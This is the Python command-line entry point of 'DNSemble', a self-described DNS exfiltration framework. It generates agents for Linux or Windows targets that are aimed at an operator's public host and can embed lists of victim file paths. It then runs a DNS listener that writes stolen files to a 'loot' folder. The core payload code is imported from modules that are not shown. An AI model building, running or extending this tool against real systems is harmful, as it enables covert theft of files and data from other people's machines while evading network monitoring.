#!/usr/bin/env python3
"""
DNSemble — DNS exfiltration framework.

Entry point: payload generation or server mode.
"""

import argparse
import sys
from pathlib import Path

from core import domains as domains_mod
from core.functions import list_payloads
from core.builder import PAYLOADS, generate_payload
from core.dnsserver import DNSembleServer


def main():
    ap = argparse.ArgumentParser(
        description="DNSemble — DNS exfiltration framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "examples:\n"
            "  %(prog)s --payloads                                 "
            "Show available payloads\n"
            "  %(prog)s --payload 1 --host 1.2.3.4                 "
            "Generate agent by number\n"
            "  %(prog)s --payload generic/python --host 1.2.3.4\n"
            "  %(prog)s --payload 2 --host 1.2.3.4 -a x86         "
            "Windows x86 payload\n"
            "  %(prog)s -p 5353                                    "
            "Start DNS listener\n"
        ),
    )

    gen = ap.add_argument_group("payload generation")
    gen.add_argument("--payloads", action="store_true",
                     help="List available payload types")
    gen.add_argument("--payload", metavar="TYPE",
                     help="Generate a payload (name or number from --payloads)")
    gen.add_argument("--host", metavar="IP",
                     help="Public IP/hostname the agent will connect to")
    gen.add_argument("-a", "--arch", choices=["x64", "x86"], default="x64",
                     help="Target architecture for Windows payloads (default x64)")
    gen.add_argument("--jitter", type=float, default=50,
                     help="Default jitter in ms baked into the agent (default 50)")
    gen.add_argument("--delay", type=float, default=100,
                     help="Default delay in ms baked into the agent (default 100)")
    gen.add_argument("-o", "--output", metavar="FILE",
                     help="Output filename (default: auto-generated)")
    gen.add_argument("--files", metavar="LIST",
                     help="Text file with target paths to embed (one per line)")
    gen.add_argument("--domains", metavar="FILE",
                     help="Custom domain list file (default: data/domains.txt)")

    srv = ap.add_argument_group("server mode")
    srv.add_argument("-p", "--port", type=int, default=5353,
                     help="UDP listen port (default 5353)")
    srv.add_argument("-u", "--upstream", default="8.8.8.8",
                     help="Upstream DNS resolver (default 8.8.8.8)")
    srv.add_argument("-l", "--loot-dir", default="./loot",
                     help="Directory to save exfiltrated files (default ./loot)")

    args = ap.parse_args()

    if args.domains:
        domains_mod.init_domains(args.domains)

    if args.payloads:
        list_payloads(PAYLOADS)
        return

    if args.payload:
        if not args.host:
            ap.error("--host is required when generating a payload")
        embedded = None
        if args.files:
            p = Path(args.files)
            if not p.is_file():
                ap.error(f"--files list not found: {args.files}")
            embedded = [l for l in p.read_text().splitlines() if l.strip()]
        generate_payload(args.payload, args.host, args.port,
                         args.jitter, args.delay, args.output,
                         arch=args.arch,
                         embedded_files=embedded,
                         domains=domains_mod.DOMAINS)
        DNSembleServer(args.port, args.upstream, args.loot_dir).start(skip_banner=True)
        return

    DNSembleServer(args.port, args.upstream, args.loot_dir).start()


if __name__ == "__main__":
    main()
